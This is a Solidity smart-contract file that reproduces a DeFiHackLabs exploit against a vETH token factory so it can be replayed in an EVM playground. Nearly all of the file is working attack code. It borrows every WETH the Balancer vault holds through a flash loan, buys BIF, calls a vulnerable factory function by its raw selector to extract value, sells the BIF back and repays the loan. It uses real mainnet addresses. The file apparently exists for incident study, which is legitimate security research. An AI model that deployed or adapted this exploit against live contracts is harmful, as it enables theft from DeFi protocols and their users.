// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../interface.sol";

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// vETH_exp.sol test's testExploit()/receiveFlashLoan() logic verbatim, but
// without inheriting forge-std Test/BaseTestWithBalanceLog (which depends on
// the Foundry cheatcode contract being deployed; that address has no code in
// a plain EVM replay, so any cheatcode-gated modifier or console2.log call
// reverts before the real attack logic runs).

contract vETH {
    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 constant BIF = IERC20(0xAefEF41f5a0Bb29FE3d1330607B48FBbA55904CE);
    IERC20 constant vETH_TOKEN = IERC20(0x280A8955A11FcD81D72bA1F99d265A48ce39aC2E);
    address constant VULN_FACTORY = address(0x62f250CF7021e1CF76C765deC8EC623FE173a1b5);
    address constant DEX_INTERFACE = address(0x19C5538DF65075d53D6299904636baE68b6dF441);
    uint256 borrowed_eth = 0;

    function testExploit() public {
        borrowed_eth = WETH_TOKEN.balanceOf(address(vault));

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = borrowed_eth;
        vault.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH_TOKEN.withdraw(borrowed_eth);
        // buy BIF
        DEX_INTERFACE.call{value: borrowed_eth}(
            abi.encodeWithSignature("buyQuote(address,uint256,uint256)", address(BIF), borrowed_eth, 0)
        );
        uint256 bif_balance = BIF.balanceOf(address(this));

        // exploit vulnerability in factory
        BIF.approve(VULN_FACTORY, bif_balance);
        VULN_FACTORY.call(abi.encodeWithSelector(0x6c0472da, address(vETH_TOKEN), address(BIF), 300 ether, 0, 0, 0));

        bif_balance = BIF.balanceOf(address(this));

        // sell BIF
        BIF.approve(DEX_INTERFACE, bif_balance);
        DEX_INTERFACE.call(
            abi.encodeWithSignature("sellQuote(address,uint256,uint256)", address(BIF), 6378941079150051291618297, 0)
        );

        // repay flashloan
        WETH_TOKEN.deposit{value: borrowed_eth}();
        WETH_TOKEN.transfer(address(vault), borrowed_eth);
    }

    fallback() external payable {}
}
